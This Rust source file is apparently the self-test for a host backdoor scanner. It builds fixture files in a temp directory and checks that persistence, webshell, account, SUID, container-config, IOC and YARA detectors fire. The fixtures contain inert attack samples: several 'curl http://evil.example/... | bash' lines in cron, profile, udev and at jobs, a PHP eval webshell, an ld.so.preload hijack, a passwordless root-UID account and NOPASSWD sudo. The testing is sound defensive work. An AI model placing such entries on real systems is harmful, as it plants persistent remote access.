//! End-to-end self-test: build a fixture filesystem containing backdoors in a temp directory,
//! scan it through `--root` semantics, and verify that the checks actually fire.
//!
//! It is the most valuable pre-release command: independent of host config and never touches real files.

use crate::ctx::Config;
use crate::engine;
use crate::model::Severity;
use anyhow::Result;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};

fn write(root: &Path, rel: &str, content: &[u8]) -> Result<()> {
    let p = root.join(rel.trim_start_matches('/'));
    if let Some(parent) = p.parent() {
        fs::create_dir_all(parent)?;
    }
    fs::write(p, content)?;
    Ok(())
}

fn write_str(root: &Path, rel: &str, content: &str) -> Result<()> {
    write(root, rel, content.as_bytes())
}

pub fn run() -> Result<bool> {
    let base = std::env::temp_dir().join(format!("warden-selftest-{}", std::process::id()));
    let _ = fs::remove_dir_all(&base);
    fs::create_dir_all(&base)?;
    println!("selftest: fixture root {}", base.display());

    // ELF header (need not be executable; only magic detection is tested)
    let elf: Vec<u8> = vec![0x7f, b'E', b'L', b'F', 2, 1, 1, 0, 0, 0, 0, 0];

    write_str(
        &base,
        "etc/crontab",
        "SHELL=/bin/sh\n*/5 * * * * root curl -fsSL http://evil.example/x.sh | bash\n",
    )?;
    write_str(
        &base,
        "etc/cron.d/legit",
        "0 4 * * * root /usr/local/bin/backup --incremental\n",
    )?;
    write_str(&base, "etc/ld.so.preload", "/tmp/evil.so\n")?;
    write_str(&base, "etc/ld.so.conf.d/evil.conf", "/tmp/libs\n")?;
    write_str(
        &base,
        "etc/modprobe.d/evil.conf",
        "install dummy /tmp/evil --flag\n",
    )?;
    write_str(
        &base,
        "etc/systemd/system/beacon.service",
        "[Unit]\nDescription=updater\n\n[Service]\nExecStart=/tmp/beacon --daemon\nRestart=always\n",
    )?;
    write_str(
        &base,
        "etc/profile.d/evil.sh",
        "curl -fsSL http://evil.example/stage2 | bash\n",
    )?;
    write_str(
        &base,
        "etc/ssh/sshd_config",
        "PermitRootLogin yes\nPermitEmptyPasswords yes\nPasswordAuthentication yes\n",
    )?;
    write_str(
        &base,
        "root/.ssh/authorized_keys",
        "command=\"/bin/sh -c id\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIselftest backdoor@example\n",
    )?;
    write_str(
        &base,
        "etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\n\
         backdoor:x:0:0::/root:/bin/bash\n\
         alice:x:1000:1000::/home/alice:/bin/bash\n",
    )?;
    write_str(
        &base,
        "etc/shadow",
        "root:$6$hash:19000:0:99999:7:::\n\
         backdoor::19000:0:99999:7:::\n\
         alice:$6$hash2:19000:0:99999:7:::\n",
    )?;
    write_str(
        &base,
        "etc/sudoers.d/devs",
        "%devs ALL=(ALL) NOPASSWD: ALL\n",
    )?;
    write(&base, "tmp/dropper", &elf)?;
    write(&base, "tmp/photo.jpg", &elf)?;
    write_str(
        &base,
        "var/www/html/upload.php",
        "<?php @eval ( $_POST['cmd'] ); ?>",
    )?;
    write_str(&base, "var/www/html/index.php", "<?php echo 'hello'; ?>")?;

    // YARA rule + marker file inside the fixture
    write_str(
        &base,
        "rules/selftest.yar",
        r#"
rule warden_selftest_marker {
  meta:
    severity = "high"
    description = "selftest YARA marker"
    attack = "T1059.001"
  strings:
    $marker = "WARDEN_SELFTEST_MARKER"
  condition:
    $marker
}
"#,
    )?;
    write_str(&base, "tmp/marker.txt", "WARDEN_SELFTEST_MARKER\n")?;

    // Container runtime configuration fixtures
    write_str(
        &base,
        "etc/docker/daemon.json",
        r#"{"hosts":["tcp://0.0.0.0:2375"],"insecure-registries":["http://reg.local"]}"#,
    )?;
    write_str(
        &base,
        "etc/containerd/config.toml",
        "[plugins.\"io.containerd.grpc.v1.cri\".registry.configs.\"reg.local\".tls]\ninsecure_skip_verify = true\n",
    )?;
    write_str(&base, "etc/group", "root:x:0:\ndocker:x:999:alice\n")?;

    // Malicious-package dataset + a local node_modules package
    write_str(
        &base,
        "malicious/mal-1.json",
        r#"{"id":"MAL-TEST","summary":"malicious fixture","affected":[{"package":{"ecosystem":"npm","name":"evil-pkg"},"versions":["1.2.3"]}]}"#,
    )?;
    write_str(
        &base,
        "node_modules/evil-pkg/package.json",
        r#"{"name":"evil-pkg","version":"1.2.3"}"#,
    )?;

    // IOC feed matching a fixture file
    let dropper_hash = crate::util::sha256_file(&base.join("tmp/dropper"), 1024 * 1024).unwrap();
    write_str(&base, "ioc.txt", &format!("{dropper_hash}\n"))?;

    // PAM / udev / at persistence fixtures
    write_str(&base, "etc/pam.d/evil", "auth required /tmp/pam_evil.so\n")?;
    write_str(
        &base,
        "etc/udev/rules.d/99-evil.rules",
        "ACTION==\"add\", RUN+=\"/bin/sh -c 'curl -fsSL http://evil.example/x | sh'\"\n",
    )?;
    write_str(
        &base,
        "var/spool/cron/atjobs/00001001",
        "#!/bin/sh\n# atrun uid=0 gid=0\ncd /\ncurl -fsSL http://evil.example/x | bash\n",
    )?;

    // World-writable config + unknown SUID program
    write_str(&base, "etc/evil.conf", "pwned\n")?;
    {
        use std::os::unix::fs::PermissionsExt;
        let p = base.join("etc/evil.conf");
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o666))?;
        write(&base, "usr/local/bin/backdoor", &elf)?;
        let p = base.join("usr/local/bin/backdoor");
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o4755))?;
    }

    let cfg = Config {
        root: base.clone(),
        webroots: vec![PathBuf::from("/var/www/html")],
        user_scope: Some(false),
        ioc: Some(base.join("ioc.txt")),
        malicious: Some(base.join("malicious")),
        paths: vec![
            std::path::PathBuf::from("/node_modules"),
            std::path::PathBuf::from("/tmp"),
        ],
        min_severity: Severity::Info,
        fail_on: Some(Severity::High),
        allowlist: None,
        yara: vec![base.join("rules")],
        color: false,
        ..Config::default()
    };

    let report = engine::run(cfg.clone())?;
    let present: HashSet<&str> = report.findings.iter().map(|f| f.check.as_str()).collect();

    let expected = [
        "persist.cron",
        "persist.systemd",
        "persist.shell_rc",
        "persist.pam",
        "persist.udev",
        "persist.at",
        "container.config",
        "persist.loader",
        "persist.ssh",
        "host.accounts",
        "fs.suspicious_bin",
        "fs.webshell",
        "fs.suid",
        "fs.world_writable",
        "ioc.hash",
        "pkg.malicious",
        "yara.rules",
    ];

    let mut ok = true;
    for id in expected {
        let hit = present.contains(id);
        println!("  [{}] {}", if hit { "PASS" } else { "FAIL" }, id);
        ok &= hit;
    }

    // YARA metadata must flow into severity and ATT&CK ids
    let yara_ok = report.findings.iter().any(|f| {
        f.check == "yara.rules"
            && f.severity >= Severity::High
            && f.mitre.iter().any(|m| m == "T1059.001")
    });
    println!(
        "  [{}] YARA rule matched fixture with metadata",
        if yara_ok { "PASS" } else { "FAIL" }
    );
    ok &= yara_ok;

    // Negative assertion: a legitimate cron entry must not be flagged
    let false_positive = report
        .findings
        .iter()
        .any(|f| f.path.as_deref() == Some("/etc/cron.d/legit"));
    println!(
        "  [{}] legitimate cron not flagged",
        if false_positive { "FAIL" } else { "PASS" }
    );
    ok &= !false_positive;

    // The baseline must contain the persistence inventory
    let snapshot = engine::snapshot_only(&cfg);
    let has_cron = snapshot.items.iter().any(|i| i.kind == "cron");
    println!(
        "  [{}] baseline contains cron entries ({} items)",
        if has_cron { "PASS" } else { "FAIL" },
        snapshot.items.len()
    );
    ok &= has_cron;

    // Phase two: macOS layout (validates cross-platform detection from Linux)
    let mac = std::env::temp_dir().join(format!("warden-selftest-mac-{}", std::process::id()));
    let _ = fs::remove_dir_all(&mac);
    fs::create_dir_all(&mac)?;
    write_str(
        &mac,
        "System/Library/CoreServices/SystemVersion.plist",
        "<plist><dict><key>ProductVersion</key><string>14.0</string></dict></plist>",
    )?;
    write_str(
        &mac,
        "Library/LaunchDaemons/com.evil.agent.plist",
        r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>Label</key><string>com.evil.agent</string>
<key>ProgramArguments</key>
<array><string>/tmp/payload</string><string>--daemon</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>"#,
    )?;
    write(&mac, "tmp/payload", &elf)?;

    // Minimal unsigned 64-bit Mach-O (no load commands).
    let mut unsigned_macho = vec![0u8; 32];
    unsigned_macho[0..4].copy_from_slice(&[0xcf, 0xfa, 0xed, 0xfe]);
    write(
        &mac,
        "Applications/Evil.app/Contents/MacOS/Evil",
        &unsigned_macho,
    )?;

    let mac_cfg = Config {
        root: mac.clone(),
        only: vec!["persist.launchd".into(), "macos.signature".into()],
        user_scope: Some(false),
        min_severity: Severity::Info,
        allowlist: None,
        color: false,
        ..Config::default()
    };
    let mac_report = engine::run(mac_cfg)?;
    let mac_hit = mac_report
        .findings
        .iter()
        .any(|f| f.check == "persist.launchd");
    println!(
        "  [{}] macOS launchd detection (cross-platform image scan)",
        if mac_hit { "PASS" } else { "FAIL" }
    );
    ok &= mac_hit;

    let mac_sig = mac_report
        .findings
        .iter()
        .any(|f| f.check == "macos.signature" && f.severity >= Severity::High);
    println!(
        "  [{}] macOS unsigned Mach-O detection",
        if mac_sig { "PASS" } else { "FAIL" }
    );
    ok &= mac_sig;
    let _ = fs::remove_dir_all(&mac);

    let code = engine::exit_code(&report, Some(Severity::High));
    println!(
        "  [{}] exit code {} (high-risk findings present)",
        if code == 1 { "PASS" } else { "FAIL" },
        code
    );
    ok &= code == 1;

    println!(
        "result: {} ({} findings)",
        if ok { "PASS" } else { "FAIL" },
        report.findings.len()
    );

    let _ = fs::remove_dir_all(&base);
    Ok(ok)
}
